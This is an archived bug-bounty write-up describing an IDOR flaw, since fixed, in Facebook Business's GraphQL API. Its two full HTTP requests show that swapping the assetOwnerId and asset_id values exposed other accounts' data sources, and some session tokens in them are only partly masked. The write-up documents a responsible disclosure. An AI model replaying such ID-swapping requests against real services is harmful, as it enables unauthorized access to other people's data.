---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-06_accessing-to-data-sources-of-any-facebook-business-account-via-idor-in-graphql.md
original_filename: 2023-03-06_accessing-to-data-sources-of-any-facebook-business-account-via-idor-in-graphql.md
title: Accessing to Data Sources of any Facebook Business account via IDOR in GraphQL
category: documents
detected_topics:
- idor
- command-injection
- otp
- graphql
- api-security
tags:
- imported
- documents
- idor
- command-injection
- otp
- graphql
- api-security
language: en
raw_sha256: 6fd584c7a01daf035d54c433f745efe5ece96431b29cf9d220b450cca89819c9
text_sha256: f3588dd5988dda04d85ae603257d78704cd866ac384cf15bf7a3c2977979c515
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: true
---

# Accessing to Data Sources of any Facebook Business account via IDOR in GraphQL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-06_accessing-to-data-sources-of-any-facebook-business-account-via-idor-in-graphql.md
- Source Type: markdown
- Detected Topics: idor, command-injection, otp, graphql, api-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: True
- Raw SHA256: `6fd584c7a01daf035d54c433f745efe5ece96431b29cf9d220b450cca89819c9`
- Text SHA256: `f3588dd5988dda04d85ae603257d78704cd866ac384cf15bf7a3c2977979c515`


## Content

---
title: "Accessing to Data Sources of any Facebook Business account via IDOR in GraphQL"
page_title: "Bug Bounty : Accessing to Data Sources of any Facebook Business account via IDOR in GraphQL | by Mukund Bhuva | Medium"
url: "https://medium.com/@mukundbhuva/accessing-the-data-sources-of-any-facebook-business-account-via-idor-in-graphql-1fc963ad3ecd"
authors: ["Mukund Bhuva (@MukundBhuva)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR", "GraphQL"]
publication_date: "2023-03-06"
added_date: "2023-03-08"
source: "pentester.land/writeups.json"
original_index: 1422
scraped_via: "browseros"
---

# Accessing to Data Sources of any Facebook Business account via IDOR in GraphQL

Bug Bounty : Accessing to Data Sources of any Facebook Business account via IDOR in GraphQL
Mukund Bhuva
Follow
2 min read
·
Mar 6, 2023

170

Vulnerability Type : IDOR
Product Area : Pages
Description/Impact :

An attacker can use an IDOR (Insecure Direct Object Reference) vulnerability to enumerate the data sources of any user with the "assetOwnerId" and "userid", allowing unauthorized access to sensitive information.

TL;DR

Press enter or click to view image in full size
Photo by Roman Martyniuk on Unsplash

A while ago, I was learning GraphQL and reading write-ups when I came across an old write-up about a bug in graphql on Facebook. So, I decided to scratch the surface a bit of that endpoint, and as I was exploring, I learned there are 2 parameters that are important and can be used to find vulnerabilities. The parameter X-Fb-Friendly-Name, or fb_api_req_friendly_name, is used to navigate through different nodes in the graph and variables to inject parameters. As I was testing, I found an api called AccountQualityHubAssetOwnerViewV2Query. As the name suggests, it is used to fetch data of the account owner, but it is also parsing variables, which is kind of interesting. {"assetOwnerId": "ID"}; as I changed the ID in the parameter, I was able to access datasources of the victim.

POST /api/graphql/ HTTP/2
Host: business.facebook.com
Content-Type: application/x-www-form-urlencoded
X-Fb-Friendly-Name: ***REDACTED-SUSPECT-TOKEN***X-Fb-Lsd: G5Wbr7fIMeYiFNPeGC7N7A
Content-Length: 1010
Origin: https://business.facebook.com

av=100009240779294&session_id=7427440000033a96&__user=100009240779294&__a=1&__dyn=7xeUmxa2C5rgydwnxxxxxxIBwCwgE98nCG6UmCyEgwjojyUW3eF8iBxa7GzU4q5Eiz8WdwJzUi-4UgwgUgwqoqyojzoO4o461mCwOxa7FEhwywCxq2u3K6UGq1eKFpobQUTwJHiG9zQE8RUeUKU9onwu8sxF3bwExm3G4UhwXxW9wgolUScyobo4a5U2dz8twAKmu7EK3i2a3Fe6rwiolDwFwBgaohzE8U98doK78-4Ea8mwnHxJUpx2awCx6i8wxK2efK2W1dx-q4VEhG7o2swQzUS2W2K4E6-bxu3ydCgqw-z8c8-5aDBwEBwKG13yxxxxxxEHyU8U3yDwbm1bwzwqp87q5rwCw&__csr=&__req=1&__hs=19360.BP%3ADEFAULT.2.0.0.0.0&dpr=1&__ccg=EXCELLENT&__rev=1006774989&__s=pxy8ln%3Aw8c1cm%3Ac2n3s5&__hsi=7184000067673134486&__comet_req=0&fb_dtsg=NAcP-eYVKjNUwErIN0fVt9pbmUChb7b3R7kRU-5ZSGb4NHdofBSCttg%3A7%3A1672671328&jazoest=25337&lsd=G5WbrxxxMeYiFNPeGC7N7A&__aaid=1433661493618529&__spin_r=1006774989&__spin_b=trunk&__spin_t=1672725067&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BusinessUnifiedScopingGlobalScopeSelectorSearchSourceQuery&variables={"assetOwnerId":"4"}&server_timestamps=true&doc_id=8009820932425164
Press enter or click to view image in full size

but I wasn’t satisfied yet, so I started digging deeper, enumerating some nodes related to datasources, and finally, I found one called "AccountQualityDataSourceViewWrapperQuery" which is used to fetch data from the datasource. so I grabbed the datasource id and pasted it into the {"asset_id": "DSID"} variable, and I was able to read the data.

POST /api/graphql/ HTTP/2
Host: business.facebook.com
Content-Type: application/x-www-form-urlencoded
X-Fb-Friendly-Name: ***REDACTED-SUSPECT-TOKEN***X-Fb-Lsd: kwwJJHnYaUEsxYK97K99ZC
Content-Length: 1023
Origin: https://business.facebook.com

av=100009240779294&session_id=28ea0000009d096e&__user=100009240779294&__a=1&__dyn=7xeUmxa2C5rgydwCwRyUxxxxxxxx2q12wAxuqErxqqax21dxebzEcWAxam4EuGfwhEmxaczES2SfxbUjx213x21FxG9y8Gdz8hwgo5qq3a4EuCx62a2q5E9UeUryFE4WWBBwLjzu2SJaECfiwznBwRyXxK9xu1UxO4VAcK2y5oeEjx63K7EC11xnzoO9wJwgEnw8ScxS2iVpUuyUd88EeAUpK19xmu2C2l0FggzE8U98doK78-4Ea8mwnHxJUpx2awCx6i8wxK2efK2W1dx-q4VEhG7o2swQzUS2W2K4E6-bxu3ydCgqw-z8c8-5aDBwEBwKG13y85i4xxxxxxxEbVEHyU8U3yDwbm1bwzwqp87q5rwCw&__csr=&__req=v&__hs=19367.BP%3ADEFAULT.2.0.0.0.0&dpr=1&__ccg=EXCELLENT&__rev=1006800734&__s=ms2lif%3Ab1de4t%3Aokl0hr&__hsi=7186800000721202577&__comet_req=0&fb_dtsg=NAcMxxxxxxx9QvBgwqtBcXmLEf7B-Q7hM3NLmo9EXixszi-JARMEsA%3A28%3A1672740455&jazoest=25544&lsd=kwwJJHnYaUEsxYK97K99ZC&__aaid=1433661493618529&__spin_r=1006800734&__spin_b=trunk&__spin_t=1673325604&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=AccountQualityDataSourceViewWrapperQuery&variables=%7B%22asset_id%22%3A%22435291730178743%22%7D&server_timestamps=true&doc_id=6218000018150890
Press enter or click to view image in full size

The vulnerability was straight-forward and easy to exploit, so I haven’t gone into details.

Get Mukund Bhuva’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The Vulnerability is fixed by now.

Next blog will be on “ Pwning the Dutch Government with RCE ”.

TIP : Use your own testing account for testing purposes.

Thank You for reading my blog. If you enjoy my content feel free to clap 👏.
